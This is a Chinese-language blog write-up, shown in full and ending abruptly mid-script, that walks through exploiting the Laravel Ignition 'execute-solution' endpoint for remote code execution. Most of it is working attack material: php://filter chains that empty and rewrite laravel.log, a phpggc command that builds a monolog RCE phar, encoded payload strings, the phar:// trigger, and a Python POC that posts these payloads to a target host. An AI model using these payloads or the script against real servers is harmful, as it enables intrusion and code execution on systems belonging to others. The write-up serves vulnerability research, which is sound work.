<p>接着调用solution对象中的<code>run()</code>方法，并将可控的<code>parameters</code>参数传过去。通过这个点我们可以调用到<code>MakeViewVariableOptionalSolution::run()</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Solutions</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">IgnitionContracts</span>\<span class="title">RunnableSolution</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Blade</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MakeViewVariableOptionalSolution</span> <span class="keyword">implements</span> <span class="title">RunnableSolution</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   ...</span><br><span class="line">   ...</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">(array $parameters = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $output = <span class="keyword">$this</span>-&gt;makeOptional($parameters);</span><br><span class="line">        <span class="keyword">if</span> ($output !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            file_put_contents($parameters[<span class="string">'viewFile'</span>], $output);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span><span class="params">(array $parameters = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $originalContents = file_get_contents($parameters[<span class="string">'viewFile'</span>]);</span><br><span class="line">        $newContents = str_replace(<span class="string">'$'</span>.$parameters[<span class="string">'variableName'</span>], <span class="string">'$'</span>.$parameters[<span class="string">'variableName'</span>].<span class="string">" ?? ''"</span>, $originalContents);</span><br><span class="line">    </span><br><span class="line">        $originalTokens = token_get_all(Blade::compileString($originalContents));</span><br><span class="line">        $newTokens = token_get_all(Blade::compileString($newContents));</span><br><span class="line">    </span><br><span class="line">        $expectedTokens = <span class="keyword">$this</span>-&gt;generateExpectedTokens($originalTokens, $parameters[<span class="string">'variableName'</span>]);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> ($expectedTokens !== $newTokens) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> $newContents;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">generateExpectedTokens</span><span class="params">(array $originalTokens, string $variableName)</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $expectedTokens = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($originalTokens <span class="keyword">as</span> $token) &#123;</span><br><span class="line">            $expectedTokens[] = $token;</span><br><span class="line">            <span class="keyword">if</span> ($token[<span class="number">0</span>] === T_VARIABLE &amp;&amp; $token[<span class="number">1</span>] === <span class="string">'$'</span>.$variableName) &#123;</span><br><span class="line">                $expectedTokens[] = [T_WHITESPACE, <span class="string">' '</span>, $token[<span class="number">2</span>]];</span><br><span class="line">                $expectedTokens[] = [T_COALESCE, <span class="string">'??'</span>, $token[<span class="number">2</span>]];</span><br><span class="line">                $expectedTokens[] = [T_WHITESPACE, <span class="string">' '</span>, $token[<span class="number">2</span>]];</span><br><span class="line">                $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, <span class="string">"''"</span>, $token[<span class="number">2</span>]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> $expectedTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>根据这段代码可以观察出这里的主要功能点是：读取一个给定的路径，并替换<code>$variableName</code>为<code>$variableName ?? &#39;&#39;</code>，之后写回文件中。</p>
<p>因为这里调用了<code>file_get_contents()</code>，且其中的参数可控。通过 <code>phar://</code>伪协议解析 phar 文件时，会将 meta-data 进行反序列化，我们或许可以利用它来 RCE。</p>
<p>原文作者给出了一种基于框架触发phar反序列化的方法：将log文件变成合法的phar文件。</p>
<p>我们的目的是要找合适的文件写入，之前的情况是使用了未知变量，但因为 <code>variableName</code> 修改文件内容前有严格验证，我们并不能利用它，也不能从页面得到任何有效信息，已存在的文件同理。</p>
<p>那么，最后的选项便是日志文件了。</p>
<h5 id="log-转-phar"><a href="#log-转-phar" class="headerlink" title="log 转 phar"></a><strong>log 转 phar</strong></h5><p>Laravel 使用 <a href="https://github.com/Seldaek/monolog" target="_blank" rel="noopener">Monolog</a> 库为各种强大的日志处理程序提供支持，<code>config/app.php</code> 配置文件的 <code>debug</code>选项决定了是否向用户显示错误信息。默认情况下，此选项设置为获取存储在 <code>.env</code> 文件中的 APP_DEBUG 环境变量的值，默认的 Laravel 日志记录在一个文件 <code>storage/logs/laravel.log</code>。</p>
<p><img src="https://i.loli.net/2021/04/11/TvrYn6dVBP4pbLh.png" alt="img"></p>
<h5 id="清空log文件"><a href="#清空log文件" class="headerlink" title="清空log文件"></a><strong>清空log文件</strong></h5><p>作者在文章中提出了使用<code>php://filter</code>中的<code>convert.base64-decode</code>过滤器的特性，将log清空。</p>
<p><img src="https://i.loli.net/2021/04/11/oB1JcOkVvD27tE5.png" alt="img"></p>
<p>可以看到<code>convert.base64-decode</code>过滤器会将一些非base64字符给过滤掉后再进行<code>decode</code>，所以可以通过调用多次<code>convert.base64-decode</code>多次触发该特性来将log清空。</p>
<p><img src="https://i.loli.net/2021/04/11/AklHTKvtGdnwIm3.png" alt="img"></p>
<p>但是这样做其实会出现一些非预期的问题</p>
<p><img src="https://i.loli.net/2021/04/11/1EnrmzWcIZfRwMS.png" alt="img"></p>
<p>如果在某次decode时，=号后面出现了别的base64字符，那么php是会报一个Warning的。且由于laravel开启了debug模式，所以会触发<code>Ignition</code>生成错误页面，导致decode后的字符没有成功写入。</p>
<p>根据这个思路的原理，我们可以将清空日志分成两个步骤：</p>
<ol>
<li>使log文件尽量变成非base64字符</li>
<li>通过<code>convert.base64-decode</code>将所有非base64字符decode，达到清空的目的</li>
</ol>
<p>作者在第一步使用的方法为多次convert.base64-decode，但是这样可能会在其中的某一环报上面提到的错误。所以我们可以想办法找到另外一种方式达到第一步的目的。</p>
<p>原log文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YAML"><figure class="iseeu highlight /yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">[2021-04-10</span> <span class="number">14</span><span class="string">:35:38]</span> <span class="attr">local.ERROR:</span> <span class="string">file_get_contents(snovving):</span> <span class="attr">failed to open stream:</span> <span class="literal">No</span> <span class="string">such</span> <span class="string">file</span> <span class="string">or</span> <span class="string">directory</span> <span class="string">&#123;"exception":"[object]</span> <span class="string">(ErrorException(code:</span> <span class="number">0</span><span class="string">):</span> <span class="string">file_get_contents(snovving):</span> <span class="attr">failed to open stream:</span> <span class="literal">No</span> <span class="string">such</span> <span class="string">file</span> <span class="string">or</span> <span class="string">directory</span> <span class="string">at</span> <span class="string">/src/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75)</span></span><br><span class="line"><span class="string">[stacktrace]</span></span><br><span class="line"><span class="comment">#0 [internal function]: Illuminate\\Foundation\\Bootstrap\\HandleExceptions-&gt;handleError(2, 'file_get_conten...', '/src/vendor/fac...', 75, Array)</span></span><br><span class="line"><span class="comment">#1 /src/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(75): file_get_contents('snovving')</span></span><br><span class="line"></span><br><span class="line"><span class="string">...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#36 /src/server.php(21): require_once('/src/public/ind...')</span></span><br><span class="line"><span class="comment">#37 &#123;main&#125;</span></span><br><span class="line"><span class="string">"&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>1、使用<code>convert.iconv.utf-8.utf-16be</code>(UTF-8 -&gt; UTF-16BE)</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"solution"</span>:<span class="string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span>,</span><br><span class="line">	<span class="attr">"parameters"</span>:&#123;</span><br><span class="line">		<span class="attr">"variableName"</span>:<span class="string">"username"</span>,</span><br><span class="line">		<span class="attr">"viewFile"</span>:<span class="string">"php://filter/write=convert.iconv.utf-8.utf-16be/resource=../storage/logs/laravel.log"</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/11/g6xjFpEk2bMRCJl.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/04/11/K5RIf6gG1XStqzu.png" alt="img"></p>
<p>2、使用<code>convert.quoted-printable-encode</code>(打印所有不可见字符)</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"solution"</span>:<span class="string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span>,</span><br><span class="line">	<span class="attr">"parameters"</span>:&#123;</span><br><span class="line">		<span class="attr">"variableName"</span>:<span class="string">"username"</span>,</span><br><span class="line">		<span class="attr">"viewFile"</span>:<span class="string">"php://filter/write=convert.quoted-printable-encode/resource=../storage/logs/laravel.log"</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/11/49kwUJqxtjsoXVz.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/04/11/n2R7aw9NHjSsr4A.png" alt="img"></p>
<p>3、使用<code>convert.iconv.utf-16be.utf-8</code>(UTF-16BE -&gt; UTF-8)</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"solution"</span>:<span class="string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span>,</span><br><span class="line">	<span class="attr">"parameters"</span>:&#123;</span><br><span class="line">		<span class="attr">"variableName"</span>:<span class="string">"username"</span>,</span><br><span class="line">    	<span class="attr">"viewFile"</span>:<span class="string">"php://filter/write=convert.iconv.utf-16be.utf-8/resource=../storage/logs/laravel.log"</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/11/FEIhXTHNJ4BmxDi.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/04/11/bDLHacTrFM1WCYZ.png" alt="img"></p>
<p>可以看到经过这样操作后log文件中所有字符变成了非base64字符，这时候再使用<code>convert.base64-decode</code>过滤器就可以成功清空了。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"solution"</span>:<span class="string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span>,</span><br><span class="line">	<span class="attr">"parameters"</span>:&#123;</span><br><span class="line">		<span class="attr">"variableName"</span>:<span class="string">"username"</span>,</span><br><span class="line">	<span class="attr">"viewFile"</span>:<span class="string">"php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log"</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/11/jWJYPzXC4uE2fNs.png" alt="img"></p>
<p>将上述链条和起来就是</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="built_in">convert</span>.iconv.utf<span class="number">-8.</span>utf<span class="number">-16</span>be|<span class="built_in">convert</span>.quoted-printable-encode|<span class="built_in">convert</span>.iconv.utf<span class="number">-16</span>be.utf<span class="number">-8</span>|<span class="built_in">convert</span>.base64-decode/resource=../storage/logs/laravel.<span class="built_in">log</span></span><br></pre></td></tr></table></figure></div>

<p>这样我们就完成了第一步。</p>
<h5 id="写入符合规范的phar文件"><a href="#写入符合规范的phar文件" class="headerlink" title="写入符合规范的phar文件"></a><strong>写入符合规范的phar文件</strong></h5><p>我们可以通过这里的<code>file_get_contents()</code>去触发日志的记录</p>
<p><img src="https://i.loli.net/2021/04/11/zCvgPIpK6sFkQy1.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/04/11/kAL71fZP8YbCioT.png" alt="img"></p>
<p>通过观察，我们可以发现log文件的格式其实是下面这样子的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[时间]</span> <span class="selector-attr">[某些字符]</span> <span class="selector-tag">PAYLOAD</span> <span class="selector-attr">[某些字符]</span> <span class="selector-tag">PAYLOAD</span> <span class="selector-attr">[某些字符]</span> 部分<span class="selector-tag">PAYLOAD</span> <span class="selector-attr">[某些字符]</span></span><br></pre></td></tr></table></figure></div>

<p>我们的PAYLOAD会在log文件中完整出现两次，我们最终需要让log文件变成我们的恶意Phar文件。所以我们还得继续对log文件进行操作。</p>
<p>原作者给出了一种使用<code>convert.iconv.utf-16le.utf-8</code>将utf-16转成utf-8的方案</p>
<p><img src="https://i.loli.net/2021/04/11/Yvm9t4HINSKnxV2.png" alt="img"></p>
<p>但是这里出现了两次PAYLOAD，我们可以在PAYLOAD后面添加一个字符，使得utf-16转成utf-8时总有一个PAYLOAD能被转换出来。</p>
<p><img src="https://i.loli.net/2021/04/11/aFklTshnxjSpQH2.png" alt="img"></p>
<p>这样子就是我们预期的效果，因为除了PAYLOAD的部分都是非base64字符，只要我们将PAYLOAD进行base64编码后再decode即可把非base64字符消除掉。</p>
<p><img src="https://i.loli.net/2021/04/11/s8buNHnc4BM1AgI.png" alt="img"></p>
<p>但是这么做还会有一个问题，就是在file_get_contents()传入\00的时候php会报一个Warning，同样会触发Debug页面的报错。所以还得想办法将空字节（\00）写入到log中。</p>
<p>好在php为了将不可见字符打印出来，给出了一个<code>convert.quoted-printable-encode</code>过滤器</p>
<p><img src="https://i.loli.net/2021/04/11/B4hzaEQyNZf9rTV.png" alt="img"></p>
<p>原理就是将字符转成ascii后前面加个=号，将其打印出来。</p>
<p>而与之对应的<code>convert.quoted-printable-decode</code>过滤器，则是相反。</p>
<p>原理是将等于号后面的ascii字符解码后，打印出来。</p>
<p><img src="https://i.loli.net/2021/04/11/38Tm42avZMtDzAb.png" alt="img"></p>
<p>所以我们可以使用=00代替\00传入到file_get_contents()中</p>
<p>所以完整和起来就是如下这样</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">php &gt; file_put_contents<span class="params">('test.txt',"[2021-04-11 11:26:54] <span class="attr">asd</span> =<span class="attr">55</span>=<span class="attr">00</span>=<span class="attr">45</span>=<span class="attr">00</span>=<span class="attr">46</span>=<span class="attr">00</span>=<span class="attr">5A</span>=<span class="attr">00</span>=<span class="attr">54</span>=<span class="attr">00</span>=<span class="attr">45</span>=<span class="attr">00</span>=<span class="attr">39</span>=<span class="attr">00</span>=<span class="attr">42</span>=<span class="attr">00</span>=<span class="attr">52</span>=<span class="attr">00</span>=<span class="attr">41</span>=<span class="attr">00</span>=<span class="attr">3D</span>=<span class="attr">00</span>=<span class="attr">3D</span>=00a <span class="attr">asda</span> =<span class="attr">55</span>=<span class="attr">00</span>=<span class="attr">45</span>=<span class="attr">00</span>=<span class="attr">46</span>=<span class="attr">00</span>=<span class="attr">5A</span>=<span class="attr">00</span>=<span class="attr">45</span>=<span class="attr">00</span>=<span class="attr">39</span>=<span class="attr">00</span>=<span class="attr">42</span>=<span class="attr">00</span>=<span class="attr">52</span>=<span class="attr">00</span>=<span class="attr">41</span>=<span class="attr">00</span>=<span class="attr">3D</span>=<span class="attr">00</span>=<span class="attr">3D</span>=00a asd")</span>;</span><br><span class="line">php &gt; <span class="keyword">echo</span> file_get_contents<span class="params">('php://filter/<span class="attr">read</span>=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/<span class="attr">resource</span>=test.txt')</span>;</span><br><span class="line">PAYLOAD</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/11/W5h4zMYKHkNFgUo.png" alt="img"></p>
<p>这样就可以成功过滤掉其他干扰字符，将PAYLOAD送到log文件中。</p>
<h5 id="写入"><a href="#写入" class="headerlink" title="写入"></a><strong>写入</strong></h5><p>我们先来尝试写入一些普通字符</p>
<h5 id="清空log文件-1"><a href="#清空log文件-1" class="headerlink" title="清空log文件"></a><strong>清空log文件</strong></h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"solution"</span>:<span class="string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span>,</span><br><span class="line">	<span class="attr">"parameters"</span>:&#123;</span><br><span class="line">		<span class="attr">"variableName"</span>:<span class="string">"username"</span>,</span><br><span class="line">    	<span class="attr">"viewFile"</span>:<span class="string">"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/11/82iMaQY59PyGKAg.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/04/11/PTgouHbDdAQqLJ1.png" alt="img"></p>
<h5 id="给log添加一条前缀"><a href="#给log添加一条前缀" class="headerlink" title="给log添加一条前缀"></a><strong>给log添加一条前缀</strong></h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AVRASM"><figure class="iseeu highlight /avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">viewFile:</span> AA</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/11/wKvX4Jo8AuTsgdy.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/04/11/9bDl1zZsR5NPamn.png" alt="img"></p>
<h5 id="将需要写入的字符编码"><a href="#将需要写入的字符编码" class="headerlink" title="将需要写入的字符编码"></a><strong>将需要写入的字符编码</strong></h5><p><img src="https://i.loli.net/2021/04/11/gukLBtsVemU2CGv.png" alt="img"></p>
<h5 id="将编码后的字符写入到log中"><a href="#将编码后的字符写入到log中" class="headerlink" title="将编码后的字符写入到log中"></a><strong>将编码后的字符写入到log中</strong></h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">viewFile: =<span class="number">55</span>=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">39</span>=<span class="number">00</span>=<span class="number">42</span>=<span class="number">00</span>=<span class="number">52</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">3</span>D=<span class="number">00</span>=<span class="number">3</span>D=<span class="number">00</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/11/sbqfxIclBRkrM79.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/04/11/t9cmsvfoIMiRO7Z.png" alt="img"></p>
<h5 id="清空干扰字符"><a href="#清空干扰字符" class="headerlink" title="清空干扰字符"></a><strong>清空干扰字符</strong></h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">viewFile: php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="built_in">convert</span>.quoted-printable-decode|<span class="built_in">convert</span>.iconv.utf<span class="number">-16</span>le.utf<span class="number">-8</span>|<span class="built_in">convert</span>.base64-decode/resource=../storage/logs/laravel.<span class="built_in">log</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/11/xrn7HZLzo1T58OX.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/04/11/WCqJkHU9nAhSXEu.png" alt="img"></p>
<p>成功写入了任意字符，log文件的内容我们可控了。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h4><p>1、编码构造，需要在 phpggc 目录中运行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="code"><pre><span class="line">php -d<span class="string">'phar.readonly=0'</span> .<span class="regexp">/phpggc monolog/</span>rce1 call_user_func phpinfo --phar phar -o <span class="string">php:</span><span class="comment">//output |base64 -w0</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/11/tsj5WkYzrCh1J6O.png" alt="img"></p>
<p>再将该base64编码后的字符进行<code>convert.quoted-printable-encode</code>编码</p>
<p><img src="https://i.loli.net/2021/04/11/JGAjf8wc17OXupN.png" alt="img"></p>
<p>2、清空 log 文件：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">viewFile: php://<span class="keyword">filter</span>/<span class="keyword">read</span>=consumed/resource=../<span class="keyword">storage</span>/logs/laravel.<span class="keyword">log</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/11/KBCOUVEtkJj7L2F.png" alt="img"></p>
<p>3、将第一步构造好的 payload 发送：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">=<span class="number">50</span>=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">39</span>=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">61</span>=<span class="number">00</span>=<span class="number">48</span>=<span class="number">00</span>=<span class="number">41.</span>..=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">55</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">3</span>D=<span class="number">00</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/11/BKlrAGzIMWSZhHm.png" alt="img"></p>
<p>4、转换文件，清空干扰字符只留下我们生成的payload：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">viewFile: php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="built_in">convert</span>.quoted-printable-decode|<span class="built_in">convert</span>.iconv.utf<span class="number">-16</span>le.utf<span class="number">-8</span>|<span class="built_in">convert</span>.base64-decode/resource=../storage/logs/laravel.<span class="built_in">log</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/11/aSv84TiOY7MFmxg.png" alt="img"></p>
<p>注意转换文件这步一定要无返回信息，如果有错误，说明前几步没能成功。</p>
<p>此时的 log 文件一定只有一条完整的 payload ，也就是纯净的 phar 文件：</p>
<p>5、触发phar反序列化伪协议：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">viewFile: phar:<span class="regexp">//</span>..<span class="regexp">/storage/</span>logs<span class="regexp">/laravel.log/</span>test.txt</span><br></pre></td></tr></table></figure></div>

<p><strong>POC</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DNS"><figure class="iseeu highlight /dns"><table><tr><td class="code"><pre><span class="line">#! -*- coding:utf-<span class="number">8</span> -*-</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">class Poc:</span><br><span class="line">    def clear_log(self,schema, host, port):</span><br><span class="line">        base_url = "&#123;&#125;://&#123;&#125;:&#123;&#125;".format(schema, host, port)</span><br><span class="line">        path="/_ignition/execute-solution"</span><br><span class="line">        req_url="&#123;&#125;&#123;&#125;".format(base_url,path)</span><br><span class="line">        payload='''</span><br><span class="line">&#123;</span><br><span class="line">  "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",</span><br><span class="line">  "parameters": &#123;</span><br><span class="line">    "variableName": "username",</span><br><span class="line">    "viewFile": "php://filter/write=convert.iconv.utf-<span class="number">8</span>.utf-<span class="number">16</span>be|convert.quoted-printable-encode|convert.iconv.utf-<span class="number">16</span>be.utf-<span class="number">8</span>|convert.base64-decode/resource=../storage/logs/laravel.log"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">        '''</span><br><span class="line">        _headers =&#123;</span><br><span class="line">            "Content-Type":"application/json"</span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(req_url,data=payload, headers=_headers, allow_redirects=False)</span><br><span class="line">        return resp.status_code</span><br><span class="line">    def add_prefix(self,schema, host, port):</span><br><span class="line">        base_url = "&#123;&#125;://&#123;&#125;:&#123;&#125;".format(schema, host, port)</span><br><span class="line">        path = "/_ignition/execute-solution"</span><br><span class="line">        req_url = "&#123;&#125;&#123;&#125;".format(base_url, path)</span><br><span class="line">        payload = '''</span><br><span class="line">        &#123;</span><br><span class="line">          "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",</span><br><span class="line">          "parameters": &#123;</span><br><span class="line">            "variableName": "username",</span><br><span class="line">            "viewFile": "AA"</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">                '''</span><br><span class="line">        _headers =&#123;</span><br><span class="line">            "Content-Type": "application/json"</span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(req_url, data=payload, headers=_headers, allow_redirects=False)</span><br><span class="line">        return resp.text</span><br><span class="line">    def send_payload(self,schema, host, port):</span><br><span class="line">        base_url = "&#123;&#125;://&#123;&#125;:&#123;&#125;".format(schema, host, port)</span><br><span class="line">        path = "/_ignition/execute-solution"</span><br><span class="line">        req_url = "&#123;&#125;&#123;&#125;".format(base_url, path)</span><br><span class="line">        payload = '''</span><br><span class="line">&#123;</span><br><span class="line">  "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",</span><br><span class="line">  "parameters": &#123;</span><br><span class="line">    "variableName": "username",</span><br><span class="line">    "viewFile": "=<span class="number">50=00=44=00</span>=<span class="number">39=00=77=00</span>=<span class="number">61=00=48=00</span>=<span class="number">41=00=67=00</span>=<span class="number">58=00=31=00</span>=<span class="number">39=00=49=00</span>=<span class="number">51=00=55=00</span>=<span class="number">78=00=55=00</span>=<span class="number">58=00=30=00</span>=<span class="number">4</span>E=<span class="number">00=50=00=54</span>=<span class="number">00=56=00=42</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=54=00=45</span>=<span class="number">00=56=00=53</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=37=00=49</span>=<span class="number">00=44=00=38</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00=44=00=51</span>=<span class="number">00=71=00=39</span>=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00=45=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">42</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span 